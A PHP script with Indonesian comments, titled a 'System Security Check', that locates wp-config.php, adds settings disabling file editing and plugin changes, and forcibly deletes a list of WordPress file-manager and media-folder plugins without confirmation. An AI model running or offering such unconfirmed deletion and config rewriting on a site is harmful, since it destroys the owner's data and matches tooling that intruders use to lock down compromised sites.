<?php
/**
 * ZEDD CLEANER - PHP NATIVE RECURSIVE DELETE
 * Menghapus plugin tanpa butuh shell_exec
 */
echo "<h3>🛠️ System Security Check</h3>";

// Daftar target plugin yang lebih lengkap sesuai permintaanmu
$targets = [
    'wp-file-manager', 'file-manager', 'advanced-file-manager', 
    'filester', 'wp-file-manager-pro', 'real-file-manager', 
    'filebird', 'wicked-folders', 'media-library-folders', 
    'wp-media-folder'
];

$file = find_config();
if (!$file) exit("❌ wp-config.php tidak ditemukan!");

$root_dir = dirname($file);
echo "📍 Target Root: <code>$root_dir</code><br>";

// Jalankan Hardening & Cleaning
harden_config($file);
clean_plugins_native($root_dir, $targets);

function find_config() {
    $dir = __DIR__;
    while ($dir !== dirname($dir)) {
        if (file_exists("$dir/wp-config.php")) return "$dir/wp-config.php";
        $dir = dirname($dir);
    }
    return false;
}

function harden_config($path) {
    $data = @file_get_contents($path);
    if (!$data) return;
    $rules = ["DISALLOW_FILE_EDIT", "DISALLOW_FILE_MODS"];
    foreach ($rules as $r) {
        if (strpos($data, $r) === false) $data .= "\ndefine('$r', true);";
    }
    @file_put_contents($path, $data);
}

// FUNGSI UTAMA: Hapus folder secara rekursif (Native PHP)
function delete_folder_recursive($dir) {
    if (!is_dir($dir)) return false;
    $files = array_diff(scandir($dir), array('.', '..'));
    foreach ($files as $file) {
        (is_dir("$dir/$file")) ? delete_folder_recursive("$dir/$file") : @unlink("$dir/$file");
    }
    return @rmdir($dir);
}

function clean_plugins_native($root, $list) {
    $p_dir = "$root/wp-content/plugins";
    if (!is_dir($p_dir)) {
        echo "❌ Folder plugins tidak ditemukan!<br>";
        return;
    }

    foreach ($list as $p) {
        $target = "$p_dir/$p";
        if (is_dir($target)) {
            // Coba ganti permission dulu biar gampang dihapus
            @chmod($target, 0777); 
            
            if (delete_folder_recursive($target)) {
                echo "🗑️ Plugin: <b>$p DONE</b><br>";
            } else {
                echo "❌ Gagal hapus: $p (Cek Permission)<br>";
            }
        }
    }
}
?>